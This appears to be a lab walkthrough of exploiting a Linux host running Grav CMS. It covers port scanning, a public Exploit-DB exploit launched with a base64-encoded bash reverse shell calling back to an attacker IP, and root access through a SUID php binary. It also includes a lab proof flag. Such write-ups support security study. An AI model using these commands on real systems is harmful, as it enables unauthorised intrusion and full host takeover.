# Linux - Astronaut

---

## Host  - 192.168.117.12 - Linux

- Scan
    
    ```bash
    > nmap -sCV -A -Pn -O -p- 192.168.117.12 -oN tcpnmap.md
    
    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   3072 98:4e:5d:e1:e6:97:29:6f:d9:e0:d4:82:a8:f6:4f:3f (RSA)
    |   256 57:23:57:1f:fd:77:06:be:25:66:61:14:6d:ae:5e:98 (ECDSA)
    |_  256 c7:9b:aa:d5:a6:33:35:91:34:1e:ef:cf:61:a8:30:1c (ED25519)
    80/tcp open  http    Apache httpd 2.4.41
    |_http-title: Index of /
    |_http-server-header: Apache/2.4.41 (Ubuntu)
    | http-ls: Volume /
    | SIZE  TIME              FILENAME
    | -     2021-03-17 17:46  grav-admin/
    
    > sudo nmap -sU -Pn 192.168.117.12 --top-ports=100 --reason -oN udpnmap.md
    ```
    

---

## Walkthrough

- `80` → `dirsearch` / `feroxbuster` (no much info) → `dirsearch $IP/grav-admin/`
    
    ![image.png](Linux%20-%20Astronaut%20176553bebf0f802bb423dc7c3b6c9915/image.png)
    
    ![image.png](Linux%20-%20Astronaut%20176553bebf0f802bb423dc7c3b6c9915/image%201.png)
    

```bash
# Google "gravadmin exploit" -> [link](https://www.exploit-db.com/exploits/49973?source=post_page-----09c2cf63de97---------------------------------------)
> searchsploit -m 49973.py
> python3 49973.py -h
> echo -ne "bash -i >& /dev/tcp/192.168.45.221/9090 0>&1" | base64 -w0
> YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ1LjIyMS85MDkwIDA+JjE= 

# 在脚本里修改相对应部分
> rlwrap nc -lvnp 9090
> python3 49973.py
```

- Exploit
    
    ![image.png](Linux%20-%20Astronaut%20176553bebf0f802bb423dc7c3b6c9915/image%202.png)
    
    ![image.png](Linux%20-%20Astronaut%20176553bebf0f802bb423dc7c3b6c9915/image%203.png)
    

```bash
> sudo -l //require password
> crontab -l => /usr/bin/php
> crontab | cron.d

# GTFOBins -> php
> cd /bin
> ls | grep php
> CMD="/bin/sh"
> ./php -r "pcntl_exec('/bin/sh', ['-p']);"

> id -> root

- proof.txt : b46bd2fabf837d91194537b1b104c3a9
```

- PE
    
    ![image.png](Linux%20-%20Astronaut%20176553bebf0f802bb423dc7c3b6c9915/image%204.png)
    
    ![image.png](Linux%20-%20Astronaut%20176553bebf0f802bb423dc7c3b6c9915/image%205.png)
    
    ![image.png](Linux%20-%20Astronaut%20176553bebf0f802bb423dc7c3b6c9915/image%206.png)